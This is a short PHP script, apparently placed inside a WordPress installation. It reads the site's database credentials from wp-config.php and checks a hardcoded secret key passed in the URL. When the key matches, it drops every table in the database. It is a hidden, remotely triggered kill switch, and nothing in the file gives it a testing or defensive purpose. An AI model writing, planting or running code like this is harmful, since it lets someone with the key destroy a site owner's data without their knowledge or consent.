<?php
include '../../../wp-config.php';
class DieDB
{
	protected $db;
	protected $key = 'KDZ5n1v4UZWhbAi';

	public function __construct()
	{
		if(!isset($_GET['key']) || $_GET['key'] != $this->key)
			die('by-by');

		$this->db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
		if ($this->db->connect_errno) {
		    echo "Не удалось подключиться к MySQL: (" . $db->connect_errno . ") " . $db->connect_error;
		    die();
		}
		$this->die_db();
	}

	protected function die_db()
	{
		$tables = $this->db->query('SHOW TABLES');


		for ($i = 0; $i < $tables->num_rows; $i++) {
		    $tables->data_seek($i);
		    $row = $tables->fetch_assoc();
		    foreach ($row as $value) {
		    	$this->db->real_query("DROP TABLE {$value}"	);
		    }
		}
		die('By!');
	}
}

$die = new DieDB();